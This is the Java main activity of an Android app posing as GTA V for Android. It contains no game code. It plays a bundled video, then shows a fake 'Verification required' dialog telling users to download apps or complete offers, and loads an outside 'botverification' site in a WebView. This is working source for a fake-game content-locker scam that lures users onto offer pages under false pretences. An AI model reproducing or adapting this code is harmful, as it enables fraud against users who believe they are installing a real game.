package com.gta5android.gtav;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.webkit.WebView;
import android.widget.VideoView;

import static android.net.Uri.parse;


public class MainActivity extends Activity {
    MediaPlayer bgSound;
    private WebView myWebView;
    VideoView videoView;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        this.bgSound = MediaPlayer.create(this,R.raw.english2);
        myWebView=findViewById(R.id.webView);
        Object localObject = getSharedPreferences("downloadstatus", 0);
        if (!((SharedPreferences)localObject).getString("download", "").equalsIgnoreCase("success"))
        {
            videoView = (VideoView)findViewById(R.id.video1);
            videoView.setVideoURI(parse("android.resource://com.gta5android.gtav/raw/germanyy"));
            videoView.requestFocus();
            videoView.start();
            localObject = ((SharedPreferences)localObject).edit();
            ((SharedPreferences.Editor)localObject).putString("download", "success");
            ((SharedPreferences.Editor)localObject).apply();
            videoView.setOnCompletionListener(new MediaPlayer.OnCompletionListener()
            {
                public void onCompletion(MediaPlayer paramAnonymousMediaPlayer)
                {
                    MainActivity.this.showAlert(null);
                }
            });
            return;
        }
        getWindow().setFormat(0);
        videoView = (VideoView)findViewById(R.id.video1);
        videoView.setVideoURI(parse("android.resource://com.gta5android.gtav/raw/germanyy"));
        videoView.requestFocus();
        videoView.start();
        videoView.setOnCompletionListener(new MediaPlayer.OnCompletionListener()
        {
            public void onCompletion(MediaPlayer paramAnonymousMediaPlayer)
            {
                MainActivity.this.showAlert(null);
            }
        });
    }

    public void showAlert(AlertDialog.Builder paramView)
    {

        paramView = new AlertDialog.Builder(this);
        paramView.setMessage("\nVerification required! Please download any apps or offer to verify.").setPositiveButton("OK", new DialogInterface.OnClickListener()
        {
            public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
            {
                MainActivity.this.bgSound.start();
                MainActivity.this.bgSound.setLooping(true);
                myWebView.loadUrl("http://gtafour.botverification.pro");
//                paramAnonymousDialogInterface = new DialogInterface("android.intent.action.VIEW", parse("http://gtafour.botverification.pro")) {
//                    @Override
//                    public void cancel() {
//
//                    }
//
//                    @Override
//                    public void dismiss() {
//
//                    }
//                };
//                MainActivity.this.startActivity(paramAnonymousDialogInterface);
            }
        }).create();
        paramView.show();
    }
}